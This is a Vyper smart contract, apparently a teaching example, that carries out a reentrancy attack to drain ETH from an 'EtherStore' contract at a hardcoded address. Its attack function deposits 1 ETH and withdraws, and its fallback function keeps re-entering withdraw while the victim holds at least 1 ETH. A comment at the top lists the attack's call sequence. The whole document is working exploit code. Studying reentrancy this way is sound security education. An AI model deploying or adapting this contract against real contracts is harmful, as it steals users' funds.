# @version >=0.3.2

"""
@notice Here is the order of function calls during the attack
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack.default (receives 1 Ether)
- EtherStore.withdraw
- Attack.default (receives 1 Ether)
- EtherStore.withdraw
- Attack.ldefault (receives 1 Ether)
"""

# @notice Interface with the Etherstore contract
interface IEtherstore:
  def deposit(): payable
  def withdraw(): nonpayable
  def getBalance() -> uint256: view

# @notice The address where the Etherstore contract is deployed
victim: public(address)

# @notice Set the victim address in the constructor
@external
def __init__():
    self.victim = 0xE79ec29a88B4Ca161280EA4D2d6f014a7A4C78F6

# @notice Default is called when EtherStore sends ETH to this contract.
@external
@payable
def __default__():
 # @dev Checks if the balance of the Etherstore contract is greater than 1 ETH (in wei)
 if IEtherstore(self.victim).getBalance() >= as_wei_value(1, "ether"):
        IEtherstore(self.victim).withdraw()

@external
@payable
def attack():
    assert msg.value >= as_wei_value(1, "ether"), "Must send 1 ETH"
    IEtherstore(self.victim).deposit(value=as_wei_value(1, "ether"))
    IEtherstore(self.victim).withdraw()

# @notice Helper function to get the balance of the contract
@external
@view
def getBalance() -> uint256:
    return self.balance
